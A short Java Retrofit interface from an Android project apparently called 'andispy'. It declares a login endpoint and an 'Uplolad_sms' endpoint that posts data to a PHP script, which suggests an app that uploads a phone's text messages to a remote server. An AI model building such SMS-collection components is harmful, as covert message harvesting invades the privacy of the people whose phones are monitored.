package com.andispy.andispy.http;


import org.json.JSONObject;

import java.util.HashMap;

import retrofit.Callback;
import retrofit.client.Response;
import retrofit.http.Body;
import retrofit.http.FieldMap;
import retrofit.http.FormUrlEncoded;
import retrofit.http.GET;
import retrofit.http.POST;
import retrofit.http.Path;

public interface Http {

    @POST("/loginandispy.php")
    void Login(@Body HashMap<String,String> data, Callback<Response> callback);

    @POST("/smsandispy.php")
    void Uplolad_sms(@Body HashMap<String,String> data, Callback<Response> callback);
}